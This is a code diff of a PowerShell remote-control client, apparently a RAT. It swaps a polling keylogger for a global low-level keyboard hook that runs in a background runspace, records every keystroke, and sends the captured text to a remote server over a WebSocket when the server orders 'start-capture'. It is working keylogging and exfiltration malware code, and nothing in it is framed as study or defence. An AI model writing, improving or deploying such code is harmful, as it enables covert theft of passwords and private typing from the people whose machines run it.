@@ -116,40 +116,8 @@ $Global:lockFile = $null
 $Global:scale = 0.6
 $Global:quality = 50
 $Global:captureInput = $false
-$Global:keyBuffer = ""
-$Global:prevKeyState = @{}
-
-# Keyboard Capture usando GetAsyncKeyState (não precisa de message loop)
-$keyCaptureCode = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-
-public class KeyCapture {
-    [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(int vKey);
-
-    [DllImport("user32.dll")]
-    public static extern int GetKeyboardState(byte[] lpKeyState);
-
-    [DllImport("user32.dll")]
-    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
-
-    [DllImport("user32.dll")]
-    public static extern uint MapVirtualKey(uint uCode, uint uMapType);
-
-    public static string GetChar(int vk) {
-        byte[] keyState = new byte[256];
-        GetKeyboardState(keyState);
-        StringBuilder sb = new StringBuilder(4);
-        uint scanCode = MapVirtualKey((uint)vk, 0);
-        int result = ToUnicode((uint)vk, scanCode, keyState, sb, sb.Capacity, 0);
-        if (result > 0) return sb.ToString();
-        return null;
-    }
-}
-"@
-try { Add-Type -TypeDefinition $keyCaptureCode } catch {}
+$Global:captureRunspace = $null
+$Global:captureQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
 
 $Global:VK = @{
     'Enter'=0x0D;'Backspace'=0x08;'Tab'=0x09;'Escape'=0x1B;'Space'=0x20;' '=0x20
@@ -401,11 +369,76 @@ function Run {
                                 $Global:scale = if ($msg.scale) { $msg.scale } else { 0.75 }
                             }
                             "start-capture" {
-                                $Global:captureInput = $true
-                                $Global:prevKeyState = @{}
+                                if (-not $Global:captureInput) {
+                                    $Global:captureInput = $true
+                                    # Iniciar runspace com hook de teclado
+                                    $Global:captureRunspace = [PowerShell]::Create()
+                                    $Global:captureRunspace.AddScript({
+                                        param($queue)
+                                        Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Collections.Concurrent;
+using System.Windows.Forms;
+using System.Threading;
+
+public class KH {
+    delegate IntPtr LP(int n, IntPtr w, IntPtr l);
+    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LP lp, IntPtr h, uint t);
+    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
+    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
+    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
+    [DllImport("user32.dll")] static extern int GetKeyboardState(byte[] s);
+    [DllImport("user32.dll")] static extern int ToUnicode(uint vk, uint sc, byte[] s, StringBuilder b, int c, uint f);
+    [DllImport("user32.dll")] static extern uint MapVirtualKey(uint c, uint t);
+    static IntPtr hk = IntPtr.Zero;
+    static LP pr = CB;
+    static ConcurrentQueue<string> Q;
+    public static bool Run = true;
+    public static void Start(ConcurrentQueue<string> q) {
+        Q = q;
+        hk = SetWindowsHookEx(13, pr, GetModuleHandle(null), 0);
+        while (Run) { Application.DoEvents(); Thread.Sleep(5); }
+        if (hk != IntPtr.Zero) UnhookWindowsHookEx(hk);
+    }
+    public static void Stop() { Run = false; }
+    static IntPtr CB(int n, IntPtr w, IntPtr l) {
+        if (n >= 0 && w == (IntPtr)0x100) {
+            int vk = Marshal.ReadInt32(l);
+            byte[] ks = new byte[256]; GetKeyboardState(ks);
+            StringBuilder sb = new StringBuilder(4);
+            int r = ToUnicode((uint)vk, MapVirtualKey((uint)vk, 0), ks, sb, 4, 0);
+            if (r > 0) Q.Enqueue(sb.ToString());
+            else {
+                if (vk == 13) Q.Enqueue("\n");
+                else if (vk == 8) Q.Enqueue("[BAK]");
+                else if (vk == 9) Q.Enqueue("[TAB]");
+            }
+        }
+        return CallNextHookEx(hk, n, w, l);
+    }
+}
+"@ -ReferencedAssemblies System.Windows.Forms
+                                        [KH]::Start($queue)
+                                    }).AddArgument($Global:captureQueue)
+                                    $Global:captureRunspace.BeginInvoke() | Out-Null
+                                }
                             }
                             "stop-capture" {
                                 $Global:captureInput = $false
+                                if ($Global:captureRunspace) {
+                                    try {
+                                        Add-Type @"
+using System; using System.Runtime.InteropServices;
+public class KHStop { [DllImport("user32.dll")] public static extern bool PostThreadMessage(uint t, uint m, IntPtr w, IntPtr l); }
+"@
+                                        [KH]::Stop()
+                                    } catch {}
+                                    try { $Global:captureRunspace.Stop() } catch {}
+                                    try { $Global:captureRunspace.Dispose() } catch {}
+                                    $Global:captureRunspace = $null
+                                }
                             }
                             "disconnect-client" { Unlock; $Global:run = $false }
                         }
@@ -426,39 +459,13 @@ function Run {
                     try { $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null } catch {}
                 }
 
-                # Enviar teclas capturadas usando GetAsyncKeyState (bit 0x0001 = pressed since last check)
-                if ($Global:captureInput) {
+                # Enviar teclas capturadas da queue (hook em runspace separado)
+                if ($Global:captureInput -and $Global:captureQueue) {
                     try {
                         $captured = ""
-                        # Todas as teclas relevantes
-                        $allKeys = @(
-                            # A-Z
-                            65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
-                            # 0-9
-                            48,49,50,51,52,53,54,55,56,57,
-                            # Numpad 0-9
-                            96,97,98,99,100,101,102,103,104,105,
-                            # Especiais
-                            32,13,8,9,190,188,186,222,219,221,220,191,189,187,192,
-                            # OEM keys
-                            106,107,109,110,111
-                        )
-                        foreach ($vk in $allKeys) {
-                            $state = [KeyCapture]::GetAsyncKeyState($vk)
-                            # Bit 0x0001 = tecla foi pressionada desde última verificação
-                            if (($state -band 1) -eq 1) {
-                                $ch = [KeyCapture]::GetChar($vk)
-                                if ($ch) {
-                                    $captured += $ch
-                                } else {
-                                    # Teclas especiais sem caractere
-                                    switch ($vk) {
-                                        13 { $captured += "[ENTER]`n" }
-                                        8 { $captured += "[BACK]" }
-                                        9 { $captured += "[TAB]" }
-                                    }
-                                }
-                            }
+                        $key = $null
+                        while ($Global:captureQueue.TryDequeue([ref]$key)) {
+                            $captured += $key
                         }
                         if ($captured.Length -gt 0) {
                             $captureMsg = @{ type="captured-keys"; clientId=$Global:id; keys=$captured } | ConvertTo-Json -Compress
